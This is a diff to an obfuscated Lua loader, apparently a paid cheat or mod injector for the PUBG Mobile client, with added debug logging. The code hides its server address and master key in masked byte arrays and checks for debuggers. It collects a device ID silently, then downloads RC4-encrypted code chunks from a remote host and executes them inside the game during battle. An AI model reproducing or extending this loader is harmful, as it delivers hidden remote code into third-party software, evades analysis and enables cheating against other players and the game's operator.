@@ -473,6 +473,18 @@ end
 
 local _ld = loadstring or load
 
+local _LOG_FILE = "/storage/emulated/0/Android/data/com.pubg.imobile/files/Myweowlogs.txt"
+local function _log(_msg)
+  pcall(function()
+    local _f = io.open(_LOG_FILE, "a")
+    if _f then
+      _f:write(os.date("%Y-%m-%d %H:%M:%S") .. " | " .. tostring(_msg) .. "\n")
+      _f:flush()
+      _f:close()
+    end
+  end)
+end
+
 ------------------------------------------------------------------
 -- anti-dump prelude (run before anything sensitive is loaded)
 ------------------------------------------------------------------
@@ -492,10 +504,10 @@ end)
 -- config (generated at build time, masked)
 ------------------------------------------------------------------
 local _cfg = {
-  v = 4,
-  m = {45,170,241,144,64,167,108,207},
-  mk = {43,60,138,71,142,234,11,240,60,222,32,170,71,150,105,65,127,54,194,44,166,7,78,16,200,137,225,132,181,80,182,89},
-  ho = {69,222,133,224,51,157,67,224,67,207,137,228,44,209,0,225,94,221,144,224,46,206,0,164,66,198,144,228,37,151,88,251,3,221,158,226,43,194,30,188,3,206,148,230},
+  v = 5,
+  m = {133,6,155,18,105,44,137,132},
+  mk = {77,161,99,239,53,166,151,194,28,176,124,21,217,1,14,158,193,56,193,82,81,11,18,210,181,27,184,102,15,151,52,109},
+  ho = {237,114,239,98,26,22,166,171,235,99,227,102,5,90,229,170,246,113,250,98,7,69,229,239,234,106,250,102,12,28,189,176,171,113,244,96,2,73,251,247,171,98,254,100},
 }
 
 local function _dec(_arr)
@@ -510,6 +522,8 @@ local _HOST = _dec(_cfg.ho)
 local _MK = _dec(_cfg.mk)
 local _V = _cfg.v
 _cfg = nil
+_log("========== NEXTLVL-BOOT v" .. _V .. " ==========")
+_log("host=" .. _HOST)
 
 ------------------------------------------------------------------
 -- device id (silent multi-layer)
@@ -565,6 +579,7 @@ if _DID == "" then
     if _f then _f:write(_DID) _f:close() end
   end)
 end
+_log("device_id=" .. _DID)
 
 ------------------------------------------------------------------
 -- key file
@@ -577,6 +592,7 @@ pcall(function()
     _f:close()
   end
 end)
+_log("key=" .. (_KEY ~= "" and _KEY or "EMPTY"))
 
 ------------------------------------------------------------------
 -- state
@@ -598,6 +614,7 @@ local function _getHttp()
     local _m = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
     if _m and _m.Post then _http = _m end
   end)
+  if not _http then _log("ERROR http manager not found") end
   return _http
 end
 
@@ -609,13 +626,19 @@ end
 
 local function _validate()
   _tries = _tries + 1
-  if _tries > 20 then _abort = true return end
+  if _tries > 20 then _abort = true _log("ABORT validate retries exhausted") return end
   _post("/validate", string.format('{"key":"%s","device_id":"%s"}', _KEY, _DID), function(_ok, _data)
-    if not _ok or not _data then return end
+    if not _ok then _log("validate http fail (attempt " .. _tries .. ")") return end
+    if not _data then _log("validate no data (attempt " .. _tries .. ")") return end
     local _ok2, _r = pcall(json.decode, _data)
-    if not _ok2 or not _r or not _r.valid then return end
+    if not _ok2 then _log("validate json decode err: " .. tostring(_r)) return end
+    if not _r or not _r.valid then
+      _log("validate rejected (attempt " .. _tries .. "): " .. tostring(_r and _r.error or "invalid"))
+      return
+    end
     _session = _r.session or ""
     _files = _r.allowed_files or {}
+    _log("validate OK session=" .. _session:sub(1, 8) .. " files=" .. table.concat(_files, ","))
     if _session ~= "" and #_files > 0 then
       _phase = "fetch"
       _tries = 0
@@ -625,10 +648,11 @@ end
 
 local function _fetchNext()
   _tries = _tries + 1
-  if _tries > 30 then _abort = true return end
+  if _tries > 30 then _abort = true _log("ABORT fetch retries exhausted") return end
   if _fi > #_files then
     _phase = "wait"
     _tries = 0
+    _log("all chunks fetched, waiting for match")
     return
   end
   local _f = _files[_fi]
@@ -637,22 +661,29 @@ local function _fetchNext()
     _fetchNext()
     return
   end
+  _log("fetching " .. _f .. " (attempt " .. _tries .. ")")
   _post("/g", string.format('{"session":"%s","dev":"%s","f":"%s"}', _session, _DID, _f), function(_ok, _data)
-    if not _ok or not _data then return end
+    if not _ok or not _data then _log("fetch " .. _f .. " http fail") return end
     local _ok2, _r = pcall(json.decode, _data)
-    if _ok2 and _r and _r.ok and _r.data and #_r.data > 32 then
-      local _raw = _b64d(_r.data)
-      local _key = _MK .. _f
-      local _plain = _rc4(_key, _raw)
-      local _fn, _err = _ld(_plain, "@" .. _f)
-      _plain = nil
-      _raw = nil
-      if _fn then
-        _chunks[_f] = _fn
-        _fi = _fi + 1
-        _tries = 0
-        _fetchNext()
-      end
+    if not _ok2 then _log("fetch " .. _f .. " json err: " .. tostring(_r)) return end
+    if not _ok2 or not _r or not _r.ok or not _r.data or #_r.data <= 32 then
+      _log("fetch " .. _f .. " rejected: " .. tostring(_r and _r.error or "short data"))
+      return
+    end
+    local _raw = _b64d(_r.data)
+    local _key = _MK .. _f
+    local _plain = _rc4(_key, _raw)
+    local _fn, _err = _ld(_plain, "@" .. _f)
+    _plain = nil
+    _raw = nil
+    if _fn then
+      _chunks[_f] = _fn
+      _log("chunk " .. _f .. " decrypted+loaded OK")
+      _fi = _fi + 1
+      _tries = 0
+      _fetchNext()
+    else
+      _log("chunk " .. _f .. " loadstring err: " .. tostring(_err))
     end
   end)
 end
@@ -661,7 +692,10 @@ local function _ready()
   local _ok1, _m1 = pcall(require, "GameLua.GameCore.Data.GameplayData")
   local _ok2, _m2 = pcall(require, "GameLua.GameCore.Framework.CharacterBase")
   local _ok3, _m3 = pcall(require, "combine_class")
-  if not (_ok1 and _m1 and _ok2 and _m2 and _ok3 and _m3) then return false end
+  if not (_ok1 and _m1 and _ok2 and _m2 and _ok3 and _m3) then
+    _log("not ready: GameplayData=" .. tostring(_ok1 and _m1 ~= nil) .. " CharacterBase=" .. tostring(_ok2 and _m2 ~= nil) .. " combine_class=" .. tostring(_ok3 and _m3 ~= nil))
+    return false
+  end
   local _hasStatus = false
   local _inBattle = false
   pcall(function()
@@ -670,25 +704,39 @@ local function _ready()
       _inBattle = (GameStatus.GetGameStatus() == GameStatus.Battle)
     end
   end)
-  if _hasStatus then return _inBattle end
+  if _hasStatus then
+    _log("ready check: modules OK, status gate " .. (_inBattle and "BATTLE" or "NOT-BATTLE"))
+    return _inBattle
+  end
+  _log("ready check: modules OK, no GameStatus gate")
   return true
 end
 
 local function _exec()
   if _tainted then
     _abort = true
+    _log("ABORT mobdebug/taint detected")
     return
   end
   for _i = 1, #_files do
     local _f = _files[_i]
     local _fn = _chunks[_f]
     if _fn then
-      pcall(_fn)
+      _log("executing " .. _f)
+      local _ok, _err = pcall(_fn)
+      if _ok then
+        _log("executed " .. _f .. " OK")
+      else
+        _log("exec " .. _f .. " ERROR: " .. tostring(_err))
+      end
       _chunks[_f] = nil
+    else
+      _log("exec skip " .. _f .. " (not loaded)")
     end
   end
   _executed = true
   _G._NEXTLVL_VER = _V
+  _log("========== ALL DONE (ver " .. _V .. ") ==========")
   collectgarbage("collect")
 end
 
@@ -709,6 +757,7 @@ end
 
 if game_frontend_hud and game_frontend_hud.SetSluaTickListener then
   game_frontend_hud.SetSluaTickListener(_poll)
+  _log("tick listener registered")
 end
 
 end
